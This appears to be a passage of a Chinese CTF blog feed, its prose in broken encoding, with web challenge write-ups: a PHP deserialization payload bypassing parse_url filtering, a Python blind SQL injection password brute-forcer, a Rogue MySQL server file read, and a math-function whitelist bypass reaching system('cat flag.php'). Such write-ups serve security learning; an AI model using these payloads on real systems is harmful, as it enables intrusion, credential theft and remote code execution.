class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°æµ‹è¯•æˆåŠŸåï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡index.phpæ–‡ä»¶ä¸­çš„è¿‡æ»¤ä»£ç ï¼š</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-fd7dd48f508be3a5.png" alt></p>
<p>å–å‡ºåŸŸååå®Œæ•´åœ°å€è·¯åŠ²ä¼ é€’ç»™å˜é‡%url,å…¶å®ä¹Ÿå°±æ˜¯åªè¦å‚æ•°ä¸­ï¼Œå³åºåˆ—åŒ–æ•°æ®ä¸­å­˜åœ¨flagå­—ç¬¦å°±dieäº†ï¼Œè¿™é‡Œåˆ©ç”¨parse_urlå‡½æ•°çš„è§£æç‰¹æ€§ï¼Œå³åˆ©ç”¨â€™///â€™è¿›è¡Œç»•è¿‡$urlè¿‡æ»¤ï¼Œparse_urlå‡½æ•°è§£æâ€™///â€˜æ—¶ä¼šè¿”å›falseï¼Œä»è€Œå¯ä»¥ç›´æ¥ç»•è¿‡è¿‡æ»¤è§„åˆ™ï¼Œæœ€ååœ¨ç»•ä¸€ä¸‹__wakeupå‡½æ•°å°±å¥½äº†ï¼Œæœ€ç»ˆpayloadä¸ºï¼š<a href="http://84e854e3a8db40e29b9958ff3e816a31f8a75c76067c4667.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%2264d52e08cc03e6090bc1ef30b73ccb85%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D" target="_blank" rel="noopener">http://84e854e3a8db40e29b9958ff3e816a31f8a75c76067c4667.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%2264d52e08cc03e6090bc1ef30b73ccb85%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</a></p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-6aae6fdb89c927a4.png" alt></p>
<p><strong>FLAGå€¼ï¼š</strong>flag{7e4d5d48-44a9-4a91-b6aa-bd6b659d1bde}</p>
<h3 id="0x02-å…¨å®‡å®™æœ€ç®€å•çš„SQL"><a href="#0x02-å…¨å®‡å®™æœ€ç®€å•çš„SQL" class="headerlink" title="0x02 å…¨å®‡å®™æœ€ç®€å•çš„SQL"></a>0x02 å…¨å®‡å®™æœ€ç®€å•çš„SQL</h3><p>æ—¢ç„¶æ˜¯SQLæ³¨å…¥ï¼Œé‚£ä¹ˆé¦–å…ˆè‚¯å®šæ˜¯å…ˆæŸ¥çœ‹æ³¨å…¥ç‚¹ï¼Œfuzzå‘ç°è¿‡æ»¤orã€ifç­‰ï¼Œå¹¶ä¸”èƒ½å¤Ÿåˆ¤æ–­å½“æˆ‘ä»¬è¾“å…¥çš„payloadèƒ½å¤Ÿæ‹¼æ¥å‡ºçš„SQLè¯­å¥æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œç½‘é¡µè¿”å›çš„æ˜¯â€œç™»é™†å¤±è´¥â€ï¼Œè€Œå½“æ‹¼æ¥å‡ºçš„SQLè¯­å¥æ‰§è¡Œé”™è¯¯æ—¶ï¼Œç½‘é¡µè¿”å›â€œæ•°æ®åº“æ“ä½œå¤±è´¥â€<br>æ‰€ä»¥ï¼Œä½¿ç”¨powå‡½æ•°ä»¥åŠ&amp;&amp;æ„é€ sqlè¯­å¥è¿›è¡Œåˆ¤æ–­</p>
<blockquote>
<p>aâ€™ &amp;&amp; 1=1 &amp;&amp; pow(9.99999999)<br>aâ€™ &amp;&amp; 1=2 &amp;&amp; pow(9.99999999)</p>
</blockquote>
<p>å½“å‰é¢çš„åˆ¤æ–­æ¡ä»¶ä¸ºå‡æ—¶ï¼Œæ•°æ®åº“å°±ä¸ä¼šæ‰§è¡Œåé¢çš„powå‡½æ•°ï¼Œå¦åˆ™å°±ä¼šæ‰§è¡Œï¼Œå½“powå‚æ•°ä¸ºpowï¼ˆ9,99999999ï¼‰æ—¶ï¼Œå°±ä¼šå› ä¸ºæ•°å­—è¿‡å¤§è€ŒæŠ¥é”™ï¼Œäºæ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹æ„é€ æ³¨å…¥è¯­å¥å¯¹æ•°æ®åº“åè¿›è¡Œæš´ç ´<br><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-425c3dd250d095c4.png" alt></p>
<p>å¾—åˆ°çš„æ•°æ®åº“åä¸ºctfï¼Œç„¶åç”±äºorè¢«è¿‡æ»¤ï¼Œæ— æ³•æŸ¥çœ‹information_schemaï¼Œä½†æ˜¯å¯ä»¥çŒœå‡ºè¡¨åä¸ºuserï¼Œæµ‹è¯•åç¡®å®šç”¨æˆ·åä¸ºadminï¼Œæ‰€ä»¥æ—¢ç„¶ä¸èƒ½å¤Ÿç›´æ¥çˆ†å‡ºflagé‚£å°±æš´ç ´å‡ºå¯†ç ç™»å…¥è¿›è¡ŒæŸ¥çœ‹ï¼Œæ„é€ è„šæœ¬è¿›è¡Œçˆ†ç ´</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = ''</span><br><span class="line">url = 'http://728b6208b313404eba7b7712cc1c3aa203c6e16dcc7a4425.changame.ichunqiu.com/'</span><br><span class="line"><span class="comment">#payload = 'no=1 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))=&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="comment">#payload = '''a' and ascii(mid(&#123;sql&#125;,&#123;list&#125;,1))=&#123;num&#125; and pow(9,9999999999)#'''</span></span><br><span class="line">payload = "a' &amp;&amp; (<span class="keyword">select</span> * <span class="keyword">from</span> ctf.user <span class="keyword">limit</span> <span class="number">1</span>) &gt; (<span class="string">'admin'</span>,<span class="string">'&#123;password&#125;'</span>) &amp;&amp; <span class="keyword">pow</span>(<span class="number">9</span>,<span class="number">9999999999</span>)<span class="comment">#"</span></span><br><span class="line"><span class="comment">#cookies = &#123;'PHPSESSID':'15lkeifat78j9p81p7k0igq7n2'&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">password</span> = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='database()',list=str(i),num=str(j)) #ctf</span></span><br><span class="line">        hh = payload.format(<span class="keyword">password</span> = <span class="keyword">str</span>(<span class="keyword">password</span> + <span class="keyword">chr</span>(j))) <span class="comment">#ctf</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql="select table_name from information_schema.tables where table_schema='ctf'",list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select * from ctf.f14g',list=str(i),num=str(j))</span></span><br><span class="line">        print hh</span><br><span class="line">        <span class="keyword">data</span> = &#123;<span class="string">'username'</span>:hh,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        try:</span><br><span class="line">            zz = requests.post(<span class="keyword">url</span>,<span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">            <span class="comment">#print zz.content</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'æ•°æ®åº“æ“ä½œå¤±è´¥'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">password</span> += <span class="keyword">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">                print <span class="keyword">password</span></span><br><span class="line">                break</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure>

<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-5d13e6227a9b2ad1.png" alt></p>
<p>ä½†æ˜¯è¿™ä¸­å†™æ³•æ˜¯åˆ¤æ–­ä¸å‡ºå¤§å°å†™çš„ï¼Œå°è¯•ä¿®æ”¹åˆ¤æ–­å¤§å°å†™åï¼Œçˆ†å‡ºå¯†ç ä¸ºï¼šF1AG@1s-at_/fll1llag_h3r3ï¼Œä½¿ç”¨ç”¨æˆ·åå¯†ç ç™»é™†è¿›å»ç«Ÿç„¶è¿˜æœ‰ä¸€å±‚</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-4076f8ade257663a.png" alt></p>
<p>çœ‹åˆ°è¿™ä¸ªâ€œä½ å¯ä»¥åœ¨è¿™é‡Œå¯¹è¿œç¨‹æ•°æ®åº“è¿›è¡Œæ“ä½œâ€ï¼Œäºæ˜¯æƒ³åˆ°æœ€è¿‘çš„ä¸€ä¸ªmysqlçš„å®‰å…¨é—®é¢˜ï¼šRogue-MySql-Serverï¼Œå¹¶ä¸”æœ€è¿‘çš„DDCTFä¹Ÿå‡ºäº†è¿™ä¸ªé—®é¢˜çš„é¢˜ç›®ã€‚å¹¶ä¸”githubä¸Šmysqlserverä¼ªé€ çš„é¡¹ç›®ï¼š<a href="https://github.com/Gifts/Rogue-MySql-Serverï¼Œåœ¨vpsä¸Šè·‘è„šæœ¬å³å¯ï¼Œå¹¶ä¸”ä¸Šé¢å¾—åˆ°çš„å¯†ç ä¹Ÿæœ‰æš—ç¤ºï¼Œflagåœ¨æ–‡ä»¶fll1llag_h3r3ä¸­ï¼ŒæŸ¥çœ‹ä¸‹mysql.logã€‚" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Serverï¼Œåœ¨vpsä¸Šè·‘è„šæœ¬å³å¯ï¼Œå¹¶ä¸”ä¸Šé¢å¾—åˆ°çš„å¯†ç ä¹Ÿæœ‰æš—ç¤ºï¼Œflagåœ¨æ–‡ä»¶fll1llag_h3r3ä¸­ï¼ŒæŸ¥çœ‹ä¸‹mysql.logã€‚</a></p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-5abe785bea01fa71.png" alt></p>
<p><strong>FLAGå€¼ï¼š</strong>flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}</p>
<h3 id="0x02-love-math"><a href="#0x02-love-math" class="headerlink" title="0x02 love math"></a>0x02 love math</h3><p>è¿™é¢˜çœŸçš„åšäº†ä¸€å¤©ï¼Œåˆ°æœ€åè¿™é¢˜åªæœ‰50å¤šåˆ†äº†ï¼ŒçœŸçš„æ˜¯åœ¨ä¸‹è€äº†ã€‚<br>æœ€å¼€å§‹å‘ç°å¯ä»¥è®¡ç®—è¿˜ä»¥ä¸ºä»¥ä¸ºæ˜¯SSTIâ€¦â€¦ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç å¯ä»¥æ‹¿åˆ°calc.phpæ–‡ä»¶çš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åæ­£è¯¥bançš„éƒ½banäº†ï¼Œä¹Ÿå°±æ˜¯æ²¡æ³•ç›´æ¥ç»•è¿‡æ­£åˆ™ï¼Œè¿™é¢˜çš„æ„æ€å°±å¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯éœ€è¦åº”ç”¨ç»™çš„mathå‡½æ•°æ¥è¿›è¡Œæ„é€ ï¼Œå‡½æ•°å†…çš„å‚æ•°ä¸å¯å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦å’Œè‹±æ–‡å­—ç¬¦ï¼ŒæŸ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯ä»¥å‘ç°base_convertå¯ä»¥è¿›è¡Œ2åˆ°36è¿›åˆ¶é—´çš„è½¬æ¢ï¼Œæ‰€ä»¥æœ€å¼€å§‹çš„æ€è·¯æ˜¯åˆ©ç”¨base_convertå°†payloadè¿›è¡Œè¿›åˆ¶è½¬åŒ–ï¼Œå³è½¬æ¢ä¸ºè‡ªç”±æ•°å­—çš„å­—ç¬¦ä¸²å°±è¡Œï¼Œå³å¯æ„é€ å‡ºä»»æ„å‡½æ•°ï¼Œæ„é€ system(ls)è¿›è¡Œæµ‹è¯•ã€‚<br>åˆ©ç”¨payloadï¼šbase_convert(1751504350,10,36)(base_convert(784,10,36))ï¼Œåˆ—å‡º/html/æ ¹ç›®å½•ï¼Œçœ‹åˆ°ç›®å½•åˆ—å‡ºæ¥çš„æ—¶å€™å¤§å–œï¼Œæ„Ÿè§‰ä¸€è¡€å°±åœ¨çœ¼å‰ï¼Œç„¶åggäº†ã€‚<br>ç”±äºç‰¹æ®Šå­—ç¬¦æ— æ³•è¿›è¡Œ36è¿›åˆ¶å’Œ10è¿›åˆ¶é—´çš„è½¬æ¢ï¼Œæ‰€ä»¥æƒ³è¦ç›´æ¥æŒ‰å‰é¢çš„payloadæ„é€ system(cat f*)æ˜¯ä¸å¯èƒ½çš„ï¼Œåæ¥æ˜¯å°†exec(cat f*)ä¸­çš„â€˜cat f*â€™è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå†è½¬æ¢ä¸º10è¿›åˆ¶ï¼Œåˆ©ç”¨dechexå‡½æ•°å’Œhex2binå‡½æ•°è¿›è¡Œè¿˜åŸï¼Œhex2binåˆ©ç”¨base_convertè½¬æ¢ä¸º10è¿›åˆ¶ï¼Œå°±è¿™ä¸ªåœ°æ–¹å¡æ­»äº†ï¼Œå› ä¸º80ä½é•¿åº¦çš„é™åˆ¶ï¼Œæˆ‘æœ€çŸ­ä¹Ÿå°±æ„é€ äº†81ä½ï¼ŒçœŸçš„æ˜¯éš¾å—ã€‚<br>åˆšå¥½ä¹‹å‰æœ‰æ¥è§¦è¿‡rand^(x).(x)çš„æ“ä½œï¼Œé€šè¿‡å¼‚æˆ–å¯ä»¥æ„é€ å‡ºå¤§å†™è‹±æ–‡å­—ç¬¦ï¼Œæ‰€ä»¥æƒ³ç€èƒ½ä¸èƒ½æ‹¼æ¥ä¸€ä¸ª$_GETæˆ–è€…$_POSTå‡ºæ¥ï¼Œå°±ä¸è¦è€ƒè™‘ä»£ç é‡Œçš„é™åˆ¶äº†ï¼Œæœ€ç»ˆåˆ©ç”¨rand^(7).(5)æ„é€ å‡ºäº†â€™ETâ€™ï¼Œç”¨is_nan^(6).(4)æ„é€ å‡ºäº†â€™_Gâ€™,åœ¨æ‹¼æ¥èµ·æ¥å°±æ„é€ å‡ºäº†_GETï¼Œæ€è·¯å°±æ˜¯å°†$contentæ„é€ ä¸º$_GET[a]( $_GET[b]),aå‚æ•°æ„é€ ä¸ºsystemå‡½æ•°ï¼Œbå‚æ•°å½“ä½œsystemå‡½æ•°çš„å‚æ•°ï¼Œå³å¯ç»•è¿‡é™åˆ¶ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…³é”®æ˜¯å°†_GETæ„é€ æˆ$_GETå‡½æ•°ï¼Œåœ¨æœ¬åœ°é…ç½®æµ‹è¯•ç¯å¢ƒ</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-a3f096398526363b.png" alt></p>
<p>æ„é€ payloadï¼š<a href="http://192.168.44.129/web2.php?c=2333;\$_GET%5ba%5d(\$_GET%5bb%5d)&amp;a=system&amp;b=ls" target="_blank" rel="noopener">http://192.168.44.129/web2.php?c=2333;\$_GET%5ba%5d(\$_GET%5bb%5d)&amp;a=system&amp;b=ls</a><br><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-43ae652631f185cb.png" alt></p>
<p>æ‰€ä»¥æ¥ä¸‹ä¸»è¦è¦è§£å†³çš„å°±æ˜¯æ„é€ $_GETï¼Œæ­£åˆ™ä¸Šä¸ä¼šè¿‡æ»¤MATHå‡½æ•°åã€å¤§æ‹¬å·ç­‰ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ç‚¹ç”¨æ¥æ„é€ å˜é‡è¦†ç›–æ¥ä»è€Œæ„é€ payloadï¼Œå…¶ä¸­ä¸­æ‹¬å·[]å¯ä»¥ç”¨å¤§æ‹¬å·æ›¿ä»£ï¼Œæœ€ç»ˆæ„é€ ï¼š$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})ï¼Œå³$cos=â€™_GETâ€™,$$cosè¦†ç›–åä¸º$_GET,æ‰€ä»¥é€šè¿‡å˜é‡è¦†ç›–åæœ€ç»ˆä¸º$_GET{atan}($_GET{atanh}),æ‰€ä»¥ç›´æ¥ç»™å‚æ•°atanå’Œatanhèµ‹å€¼ï¼Œå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼Œæœ€ç»ˆæ„é€ ï¼š2333333;$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})&amp;atan=system&amp;atanh=cat flag.phpï¼Œå…¶ä¸­2333333;ç”¨äºé—­åˆechoï¼Œä¸è¿‡ä¸é—­åˆä¹Ÿå¯ä»¥çš„ï¼Œä¾¿å¯å¾—åˆ°flagã€‚<br>åæ¥ç»§ç»­æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°åˆ©ç”¨exec(nl *)è¿›è¡Œç¼©çŸ­ç«Ÿç„¶å¯ä»¥ç¼©åˆ°79ä½ï¼ˆåè¡€ï¼‰ï¼ï¼ï¼â€¦â€¦è¿™é‡Œç›´æ¥è´´ç¼©çš„payloadï¼šbase_convert(47138,20,36)(base_convert(1438255411,14,34)(dechex(474260465194)))ï¼Œå…¶ä¸­hex2binè¿›è¡Œ14/34è¿›åˆ¶çš„è½¬æ¢ï¼Œexecè¿›è¡Œ20/36è¿›åˆ¶çš„è½¬æ¢å°±å¯ä»¥è¾¾åˆ°79ä½ã€‚<br>è¿™é“é¢˜çš„è§£æ³•æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚åœ¨æ„é€ $cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})æ—¶ï¼Œ$$cos{atan}å¯ä»¥ç›´æ¥åˆ©ç”¨base_convertå‡½æ•°å°†systemæˆ–è€…evalè¿›è¡Œ10/36è¿›åˆ¶è½¬æ¢è¿›è¡Œåˆ©ç”¨ã€‚<br>å¦‚æœæ²¡æœ‰è¿‡æ»¤åå¼•å·ï¼Œå…¶å®ä¼šç®€å•å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒPç¥çš„ï¼š<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">æ— å­—æ¯æ•°å­—Webshellä¹‹æé«˜ç¯‡ </a>é—­åˆå‰ä¸€æ®µ&lt;?phpï¼Œåˆ©ç”¨&lt;?=å¼€è¾Ÿä»£ç ï¼Œé€šè¿‡â€™`. /???/???/????/????.????`â€˜æ¥æ‰“å°æ–‡ä»¶å†…å®¹ï¼Œè¯¦ç»†çš„å¯ä»¥æœ¬åœ°æµ‹è¯•è°ƒè¯•ä¸åšè¿‡å¤šè¯´æ˜ã€‚</p>
<p><strong>FLAGå€¼ï¼š</strong>flag{86fed0d1-42ec-46ba-83ee-7dedd09303fb}</p>
<h3 id="0x03-RefSpace"><a href="#0x03-RefSpace" class="headerlink" title="0x03 RefSpace"></a>0x03 RefSpace</h3><p>è·¯èµ°é”™äº†ï¼Œè·‘å»é€†å‘æ–‡ä»¶äº†ã€‚è¿™ä¸ªè¿˜æ˜¯ç­‰å¤§ä½¬çš„wpäº†</p>
<p><strong>ä¸ªäººè§‰å¾—Webæ²¡é‚£ä¹ˆç®€å•ï¼Œè¢«åˆ·åˆ°ä¸¤ä½æ•°çš„åˆ†æœ‰ç‚¹æ„å¤–åˆ°ï¼Œä¸å¤šè¯´ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>SQL</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»£ç å®¡è®¡çŸ¥è¯†æ˜ŸçƒäºŒå‘¨å¹´ç»ƒæ‰‹</title>
    <url>/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/</url>
    <content><![CDATA[<h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy_function"></a>easy_function</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action(<span class="string">''</span>, $arg);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>æ­£åˆ™ç¦ç”¨äº†a-z0-9_ï¼ŒåŒæ—¶åŒ¹é…äº†^$ï¼Œå³åœ¨å¼€å¤´ç»“å°¾åŠ ä¸Šç¬¦åˆæ­£åˆ™çš„å­—ç¬¦å°±å¯ä»¥ç»•è¿‡åç»­å­—ç¬¦ä¸²çš„åŒ¹é…ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯fuzzä¸€ä¸‹å¼€å¤´ç»“å°¾ï¼Œçœ‹çœ‹ä¼šä¸ä¼šå­˜åœ¨æŸä¸ªå­—ç¬¦ä½¿å¾—æ•´ä¸ªå­—ç¬¦ä¸²å¯ä»¥ç»•è¿‡æ­£åˆ™ä¸”å‡½æ•°å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œå†™ä¸€ä¸ªfuzzè„šæœ¬ğŸ‘‡</p>
